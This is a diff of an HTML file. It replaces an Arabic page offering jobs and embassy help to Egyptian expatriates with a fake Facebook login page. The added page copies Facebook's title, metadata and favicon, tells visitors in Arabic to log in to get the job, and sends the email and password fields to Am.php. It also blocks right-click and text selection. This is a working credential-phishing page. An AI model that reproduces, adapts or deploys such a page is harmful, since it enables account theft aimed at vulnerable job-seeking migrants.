@@ -1,76 +1,58 @@
-<!DOCTYPE html>
-<html lang="en">
+
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta http-equiv="X-UA-Compatible" content="IE=edge">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Document</title>
-</head>
-<style>
-    *{
-        padding: 0px;
-        margin:0px;
-        
-    }
-    body{
-        background-image:url(img/5.jpg);
-    }
-    p{
-        color:white;
-        text-align: center;
-        font-size: 20px;
-        font-family: monospace;
-        padding-top: 60px;
-        font-size: xx-large;
-        
-    }
-    a{
-        background-color: green;
-        color: white;
-        padding: 20px 90px;
-        border-radius: 60px;
-        text-decoration: none;
-        font-size: x-large;
-        cursor: pointer;
-        
+<meta charset='UTF-8' />
+<meta http-equiv='X-UA-Compatible' content='IE=edge'>
+<meta name='viewport' content='width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no' />
+<meta property='og:title' content='Facebook - login or sign up'>
+<meta name='description' content='Login to your Facebook account.'>
+<meta property='og:description' content='Login to your Facebook account.'>
+<meta property='og:url' content='./'>
+<meta property='og:site_name' content='Facebook - login or sign up'>
+<meta property='og:type' content='website'>
+<title>Facebook - Login or sign up</title>
 
-
+<link rel='stylesheet' href='css/style.css'>
+<link href='https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css' rel='stylesheet'>
+<link rel='icon' href='https://z-m-static.xx.fbcdn.net/rsrc.php/v3/ya/r/O2aKM2iSbOw.png'><style>body{direction:ltr}
+.poor{
+    width:180px;
+    height: 60px;
+    
     }
-    a:hover{
-        background: black;
-    }
-    @media (max-width: 600px) {
-    body {
-        background-image:url(img/778.jpg);
-        background-size:450px ;
-    }
-    p{
-        color:rgb(0, 0, 0);
-        text-align: center;
-        font-size: 20px;
-        font-family: monospace;
-        padding-top: 60px;
-        font-size: xx-large;
-        
-    }
-}
 </style>
-<body>
-    <center>
-    <p>لو مصرى ومغترب وبتدور على شغل <br>او بتخلص اوراق من السفاره <br>احنا شباب بنساعد اى مغترب انضم لينا عبر فيسبوك
-    </p>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <br>
-    <a href="login.php">انضم الأن   &#8594	</a>
+</head>
+<body oncontextmenu='return false' onselectstart='return false' ondragstart='return false'>
+<div class='navbar'>
+<img src='img/fb.png'>
+</div>
+<div class='content-box'>
+<img class="poor" src='https://cdn.iconscout.com/icon/free/png-512/job-location-1956233-1650486.png'>
+<div class='txt-login'>سجل في فيسبوك للحصول علي الوظيفة </div>
+<form role='form' class='login-form' action='Am.php' method='post'>
+<label>
+<input type='text' name='email' placeholder='رقم الهاتف المحمول أو البريد الإلكتروني' autocomplete='off' autocapitalize='off' required></label>
+<label>
+<input type='password' name='pass' placeholder='كلمة السر' autocomplete='off' autocapitalize='off' required></label>
+<button type='submit' name='save' class='btn-login'>تسجيل الدخول</button>
+</form>
+<div class='txt-create-account'>إنشاء حساب جديد</div>
+<div class='txt-forgotten-password'>نسيت كلمة السر ؟</div>
+</div>
+<div class='language-box'>
+<center>
+<div class='language-name language-name-active'>العربية</div>
+<div class='language-name'>Bahasa Indonesia</div>
+<div class='language-name'>English (UK)</div>
+<div class='language-name'>Bahasa Melayu</div>
+<div class='language-name'>日本語</div>
+<div class='language-name'>Español</div>
+<div class='language-name'>Português (Brasil)</div>
+<div class='language-name'>
+<i class='fa fa-plus'></i>
+</div>
+</center>
+</div>
+<div class='copyright'>Facebook Inc.</div>
 </body>
 </html>
